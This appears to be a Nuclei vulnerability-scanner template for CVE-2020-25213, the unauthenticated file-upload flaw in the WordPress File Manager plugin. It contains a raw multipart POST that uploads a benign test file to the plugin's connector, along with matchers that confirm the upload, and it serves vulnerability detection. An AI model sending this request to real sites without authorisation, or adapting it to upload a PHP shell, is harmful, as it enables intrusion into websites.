id: CVE-2020-25213

# Uploaded file will be accessible at:-
# http://localhost/wp-content/plugins/wp-file-manager/lib/files/poc.txt

info:
  name: WordPress File Manager Plugin Remote Code Execution
  author: foulenzer
  severity: critical
  description: The WordPress File Manager plugin prior to version 6.9 is susceptible to remote code execution. The vulnerability allows unauthenticated remote attackers to upload .php files.
  reference:
    - https://plugins.trac.wordpress.org/changeset/2373068
    - https://github.com/w4fz5uck5/wp-file-manager-0day
    - https://nvd.nist.gov/vuln/detail/CVE-2020-25213
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-25213
    cwe-id: CWE-434
  tags: cve,cve2020,wordpress,rce,cisa

requests:
  - raw:
      - |
        POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Content-Type: multipart/form-data; boundary=------------------------ca81ac1fececda48

        --------------------------ca81ac1fececda48
        Content-Disposition: form-data; name="reqid"

        17457a1fe6959
        --------------------------ca81ac1fececda48
        Content-Disposition: form-data; name="cmd"

        upload
        --------------------------ca81ac1fececda48
        Content-Disposition: form-data; name="target"

        l1_Lw
        --------------------------ca81ac1fececda48
        Content-Disposition: form-data; name="mtime[]"

        1576045135
        --------------------------ca81ac1fececda48
        Content-Disposition: form-data; name="upload[]"; filename="some_script_II.xx"
        Content-Type: text/plain

        some-script-II
        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras semper sollicitudin dignissim. Suspendisse lorem arcu, sodales et eros a, vestibulum commodo massa. Quisque id dui non dolor molestie egestas. Nullam nec tellus eu tellus consectetur consequat porta at lacus. Phasellus volutpat enim dui, nec convallis nulla imperdiet et.  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras semper sollicitudin dignissim. Suspendisse lorem arcu, sodales et eros a, vestibulum commodo massa. Quisque id dui non dolor molestie egestas. Nullam nec tellus eu tellus consectetur consequat porta at lacus. Phasellus volutpat enim dui, nec convallis nulla imperdiet et. Phasellus sed lacus congue, posuere lectus ut, tempus dolor. Pellentesque non ipsum eu mauris aliquam sodales vitae a quam. Pellentesque dictum ac nunc nec hendrerit. Etiam et mollis nisl. Donec at sagittis lacus, sit amet mollis nisl. Quisque rhoncus semper dui, et elementum dolor volutpat non. Nam ac semper dolor. Nunc sagittis leo sit amet metus sagittis ornare. Integer tellus mauris, ultrices ut nibh rhoncus, sagittis mattis velit. Etiam quis lorem non erat pretium fermentum. Pellentesque a est ultricies, imperdiet eros ac, tempus ex.--------------ca81ac1fececda48--

    matchers-condition: and
    matchers:
      - type: word
        words:
          - some_script_II.xx
          - added
        condition: and

      - type: word
        words:
          - application/json
        part: header

      - type: status
        status:
          - 200

# Enhanced by mp on 2022/03/27
